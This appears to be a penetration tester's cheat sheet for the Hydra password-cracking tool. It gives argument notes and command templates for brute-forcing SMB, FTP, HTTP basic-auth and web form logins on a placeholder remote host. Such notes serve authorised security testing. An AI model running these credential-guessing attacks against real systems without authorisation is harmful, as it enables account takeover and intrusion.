### Source
https://github.com/vanhauser-thc/thc-hydra  

### Some useful arguments
```
-l user, -L userList
-C user-pass-list (root:password)
-p password, -P  passwordlist
-e = nsr "n" null password, "s" login as pass and/or "r" reversed login
-s use another port
```

### Bruteforce smb login 
```
hydra -L <userFile> -P <pwFile> -e nsr smb://<rhost>
```

### Bruteforce ftp login, -t number of simultaneously tasks, -f stop on success
```
hydra -t 5 -V -f -C <userPassFile> ftp://<rhost>
```

### Bruteforce basic authentication, -f stop on success
```
hydra -C <userPassFile> -f <rhost> -s <port> http-get </path/to/login>
```

### Bruteforce http login (use http-post-form for POST)
```
hydra <rhost> -V -l <user> -P <pwFile> http-get-form "<path/to/login.php>:<userParam>=^USER^&<passwordParam>=^PASS^:<Login error>"
```

